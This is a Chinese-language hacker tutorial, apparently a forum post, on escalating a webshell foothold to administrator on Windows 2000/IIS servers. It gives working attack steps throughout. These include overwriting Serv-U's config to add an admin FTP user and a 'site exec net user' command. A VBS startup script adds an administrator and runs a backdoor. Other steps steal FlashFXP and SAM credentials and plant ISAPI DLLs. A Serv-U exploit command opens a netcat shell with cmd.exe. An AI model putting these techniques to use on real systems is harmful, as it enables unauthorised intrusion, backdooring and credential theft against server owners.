 说到花了九牛二虎的力气获得了一个webshell，  
当然还想继续获得整个服务器的admin权限，正如不想得到admin的不是好黑客～  
嘻嘻～～好跟我来，看看有什么可以利用的来提升权限  


第一  
如果服务器上有装了pcanywhere服务端，管理员为了管理方便  
也给了我们方便，到系统盘的Documents and Settings/All Us  
ers/Application Data/Symantec/pcAnywhere/中下载*.cif本地  
破解就使用pcanywhere连接就ok了  

第二  
有很多小黑问我这么把webshell的iis user权限提升  
一般服务器的管理都是本机设计完毕然后上传到空间里， 
那么就会用到ftp，服务器使用最多的就是servu  
那么我们就利用servu来提升权限  
通过servu提升权限需要servu安装目录可写～  
  
  
好开始把，首先通过webshell访问servu安装文件夹下的ServUDaemon.ini把他下载  
下来，然后在本机上安装一个servu把ServUDaemon.ini放到本地安装文件夹下覆盖，  
启动servu添加了一个用户，设置为系统管理员，目录C:\，具有可执行权限  
然后去servu安装目录里把ServUDaemon.ini更换服务器上的。  
用我新建的用户和密码连接～  
好的，还是连上了  

ftp  
ftp>open ip  
Connected to ip.  
220 Serv-U FTP Server v5.0.0.4 for WinSock ready...  
User (ip:(none)): id //刚才添加的用户  
331 User name okay, please send complete E-mail address as password.  
Password:password //密码  
230 User logged in, proceed.  
ftp> cd winnt //进入win2k的winnt目录  
250 Directory changed to /WINNT  
ftp>cd system32 //进入system32目录  
250 Directory changed to /WINNT/system32  
ftp>quote site exec net.exe user rover rover1234 /add //利用系统的net.exe  

文件加用户。  
如果提示没有权限，那我们就  
把后门（server.exe） 传他system32目录  
然后写一个VBs教本  

set wshshell=createobject ("wscript.shell")  
a=wshshell.run ("cmd.exe /c net user user pass /add",0)  
b=wshshell.run ("cmd.exe /c net localgroup Administrators user /add",0)  
b=wshshell.run ("cmd.exe /c server.exe",0)  
  
存为xx.vbe  
这个教本的作用是建立user用户密码为pass  
并且提升为管理员  
然后执行system32目录下的server.exe  
把这个教本传他 C:\Documents and Settings\All Users\「开始」菜单\程序\启动  
目录  
这样管理员只要一登陆就会执行那个教本.  
接下来就是等了.等他登陆.  

第三  

就是先检查有什么系统服务，或者随系统启动自动启动的程序和管理员经常使用的软件， 比如诺顿，VAdministrator，金山，瑞星,WinRAR甚至QQ之类的，是否可以写，如果可以就修改其程序， 绑定一个批处理或者VBS，然后还是等待服务器重启。  


第四  

查找conn和config ,pass这类型的文件看能否得到sa或者mysql的相关密码，可能会有所  
收获等等。  
  
第五  

使用Flashfxp也能提升权限，但是成功率就看你自己的运气了  
首先找到FlashFXP文件夹，打开(编辑)Sites. dat，这个文件这是什么东西密码和用户名，  
而且密码是加了密的。 如果我把这些文件copy回本地也就是我的计算机中，替换我本地的相应文件。然后会发现 打开flashfxp在站点中打开站点管理器一样。又可以添加N多肉鸡啦～～嘻嘻～  
唔？？不对啊，是来提升权限的啊，晕，接着来别半途而废。  
大家看看对方管理员的这站点管理器，有用户名和密码，密码是星号的。经过用xp星号密码 查看器查看，然后和Sites.dat中加密了密码做比较发现并未加密而是查到的密码是明文显示， 然后最终把这个网站管理员的密码从这堆东西中找  
出来。那么下一步就可以链接这些新的服务器啦～～  
经过测试只要把含有密码和用户名的Sites.dat文件替换到本地相应的文件就可以在本地  
还原对方管理员的各个站点的密码。  


第六 
WIN2K+IIS5.0默认情况下应用程序保护选项是"中（共用的）"，这时IIS加载isapi是用的  
iwam_computername用户身份执行。  
但默认情况下WIN2K+IIS5对于一些特殊isapi又要以system身份加载。win2k+iis5 、  
win2k+iis5+sp1、win2k+iis5+sp2都是简单的判断isapi的文件名，并且没有做目录限制，  
以SYSTEM权限加载的isapi有：  
1、 idq.dll  
2、 httpext.dll  
3、 httpodbc.dll  
4、 ssinc.dll  
5、 msw3prt.dll  
6、 author.dll  
7、 admin.dll  
8、 shtml.dll  
9、 sspifilt.dll  
10、compfilt.dll  
11、pwsdata.dll  
12、md5filt.dll  
13、fpexedll.dll  
所以利用这很容易得到SYSTEM权限。并且判断文件名的时候有个bug，比如请求/scripts/test%81%5cssinc.dll也将会认为是请求的ssinc.dll,就是分离文件路径的时候没有考虑到双字节的 远东版问题。ssinc.dll在处理包含文件路径的时候也有一个问题，就是"/"、"\"只识别了一个 "/"，所以如果请求里面使用"\"，就会错误的处理包含文件路径，有可能泄露东西或者出现权限 漏洞，这种漏洞很多别的地方（ php、asp等）也还存在。  
加载这些isapi不是单以文件名做依据了，而是加了路径，应该是修正了此问题。  
一般默认情况下是：  
1、 idq.dll d:\winnt\system32\idq.dll  
2、 httpext.dll d:\winnt\system32\inetsrv\httpext.dll  
3、 httpodbc.dll d:\winnt\system32\inetsrv\httpodbc.dll  
4、 ssinc.dll d:\winnt\system32\inrtsrv\ssinc.dll  
5、 msw3prt.dll d:\winnt\system32\msw3prt.dll  
6、 author.dll D:\Program Files\Common Files\Microsoft Shared\web server extensions\40\isapi\_vti_aut\author.dll  
7、 admin.dll D:\Program Files\Common Files\Microsoft Shared\web server extensions\40\isapi\_vti_adm\admin.dll  
8、 shtml.dll D:\Program Files\Common Files\Microsoft Shared\web server extensions\40\isapi\shtml.dll  
9、 sspifilt.dll d:\winnt\system32\inetsrv\sspifilt.dll  
10、compfilt.dll d:\winnt\system32\inetsrv\compfilt.dll  
11、pwsdata.dll d:\winnt\system32\inetsrv\pwsdata.dll  
12、md5filt.dll d:\winnt\system32\inetsrv\md5filt.dll  
13、fpexedll.dll D:\Program Files\Common Files\Microsoft Shared\web server extensions\40\bin\fpexedll.dll  
正常情况下这些路径都guest不能写,但如果配置不好，这些路径iis user能够写了就一样可以提升权限了  
可以把ISAPIHack.dll上传到IIS的可执行目录，文件名可叫ssinc.dll或者admin.dll等（上面列的13个文件名之一）。  
然后等待IIS重启加载此dll，就可以获得权限了  

第七 
  
下载系统的 %windir%\repair\sam.*（WinNT 4下是sam._ 而Windows 2000下是sam）文件，  
然后用L0pht等软件进行破解，只要能拿到，肯花时间，就一定可以破解。  


第八 

PipeUpAdmin（Windows 2000下）, 在本机运行可以把当前用户帐号加入管理员组。普通用户和Guests组用户都可以成功运行。  


第九  

Serv-u Ftp Server 本地权限提升漏洞：  
很多主机的C:\Documents and Settings\All Users\ Documents目录以及下边几个子目录Documents没有设置权限，导致可以在这个目录上传并运行Exp. 直接上传了serv-u local exploit 和nc, 并且把serv-u的本地提升权限的名字命名为su.exe 文件就放在C:\Documents and Settings\All Users\ Documents, 然后我们用su.exe直接建立用户,也可以反弹一个shell过来的。  
具体命令：  
建立用户: serv-u.exe "cmd"  
>USER xl  
>PASS 111111  
反弹shell: serv-u.exe "nc.exe -l -p 99 -e cmd.exe"  

 
 
 